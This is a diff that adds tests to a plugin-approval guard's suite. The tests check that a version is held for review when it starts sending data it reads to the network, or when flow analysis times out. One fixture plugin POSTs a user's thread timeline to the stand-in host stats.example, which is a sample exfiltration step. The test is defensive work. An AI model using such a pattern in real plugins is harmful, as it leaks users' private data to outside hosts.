@@ -167,6 +167,40 @@ describe("what sends a version to the queue", () => {
     expect(queueNote(g, d.requestId)).toMatch(/новое право: .*network/);
     expect(journal(g, "approved.source")).toHaveLength(0);
   });
+  it("a new way out for what it reads is a new right, though the network was there before: the guard counts it itself", async () => {
+    const read = `const t = await bb.sdk.threads.timeline({ threadId: "x" });`;
+    const quiet = `export default async function plugin(bb) {\n  ${read}\n  await fetch("https://stats.example/ping", { method: "POST", body: "ping" });\n}\n`;
+    const g = await guard();
+    const dir = tmp();
+    const v = plugin(dir, "demo", quiet);
+    await addMine(g, [`path:${dir}`]);
+    await approveFirst(g, decideOf(v));
+    // the plugin's own process cannot tell the guard what the code does: the guard reads the directory and follows the data itself
+    writeFileSync(join(v, "server.ts"), quiet.replace('body: "ping"', "body: JSON.stringify(t)"));
+    const d = await g.send(decideOf(v));
+    expect(d).toMatchObject({ action: "wait" });
+    expect(queueNote(g, d.requestId)).toMatch(/новое право: flow, flow:threads>network:stats\.example/);
+    expect(journal(g, "approved.source")).toHaveLength(0);
+    // and the same code with the body that is not what was read passes: the rights did not grow
+    writeFileSync(join(v, "server.ts"), quiet + "// again\n");
+    expect(await g.send(decideOf(v))).toMatchObject({ action: "proceed", via: "source" });
+  });
+  it("the clock stopped the flow analysis: the version is held, «проверка не успела», and no right comes of it", async () => {
+    let stop = false;
+    const g = await guard({ checks: async (dir, o) => (stop ? { ...(await runChecks(dir, o)), flows: undefined, flowsTimedOut: true as const } : runChecks(dir, o)) });
+    const dir = tmp();
+    const v = plugin(dir, "demo", BASE);
+    await addMine(g, [`path:${dir}`]);
+    await approveFirst(g, decideOf(v));
+    writeFileSync(join(v, "server.ts"), BASE + "// v2\n");
+    stop = true;
+    const d = await g.send(decideOf(v));
+    expect(d).toMatchObject({ action: "wait" });
+    expect(journal(g, "approved.source")).toHaveLength(0);
+    // the next evaluation, when the analysis finishes, lets it in as before: the rights did not change
+    stop = false;
+    expect(await g.send(decideOf(v))).toMatchObject({ action: "proceed", via: "source" });
+  });
   it("a right that was approved before stays free: a version with it passes", async () => {
     const { g, v } = await ready();
     writeFileSync(join(v, "server.ts"), FETCH);
